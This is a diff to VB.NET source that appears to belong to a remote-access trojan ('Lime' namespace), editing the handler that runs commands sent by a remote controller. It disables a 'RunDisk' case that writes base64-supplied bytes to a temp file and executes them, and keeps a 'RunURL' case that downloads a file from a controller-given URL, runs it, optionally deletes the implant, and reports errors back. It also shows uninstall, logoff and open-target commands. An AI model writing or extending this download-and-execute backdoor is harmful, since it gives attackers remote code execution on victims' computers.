@@ -18,28 +18,28 @@ Namespace Lime
                     Case "Uni"
                         Insistence.DEL()
                    '###############################################################################
-                    Case "RunDisk"
+                '  Case "RunDisk"
+                '     Try
+                'Dim NewFile = Path.GetTempFileName & IO.Path.GetExtension(A(1))
+                ' File.WriteAllBytes(NewFile, Convert.FromBase64String(A(2)))
+                ' Thread.CurrentThread.Sleep(1000)
+                '   Process.Start(NewFile)
+                '       If A(3).ToString = "update" Then
+                '   Insistence.DEL()
+                '   End If
+                'Catch ex As Exception
+            'End Try
+                    Case "RunURL"
                         Try
                             Dim NewFile = Path.GetTempFileName & IO.Path.GetExtension(A(1))
-                            File.WriteAllBytes(NewFile, Convert.FromBase64String(A(2)))
-                            Thread.CurrentThread.Sleep(1000)
+                            My.Computer.Network.DownloadFile(A(1), NewFile)
+                            Threading.Thread.CurrentThread.Sleep(1000)
                             Process.Start(NewFile)
                             If A(3).ToString = "update" Then
                                 Insistence.DEL()
                             End If
                         Catch ex As Exception
-                        End Try
-                    Case "RunURL"
-                        Try
-                            Dim NewFile = Path.GetTempFileName & Path.GetExtension(A(1))
-                            My.Computer.Network.DownloadFile(A(1), NewFile)
-                            Thread.CurrentThread.Sleep(1000)
-                            Process.Start(NewFile)
-                            If A(2).ToString = "update" Then
-                                Insistence.DEL()
-                            End If
-                        Catch ex As Exception
-                            C.Send("MSG" & C.SPL & "[URL] " & ex.Message)
+                            C.Send("MSG" & C.SPL & "[Error! URL] " & ex.Message)
                         End Try
                    '###############################################################################
                     Case "Logoff"
@@ -70,7 +70,7 @@ Namespace Lime
                         Try
                             Process.Start(A(1))
                         Catch ex As Exception
-                            C.Send("MSG" & C.SPL & "[VISIT] " & ex.Message)
+                            C.Send("MSG" & C.SPL & "[Error! VISIT] " & ex.Message)
                         End Try
                 End Select
             Catch ex As Exception
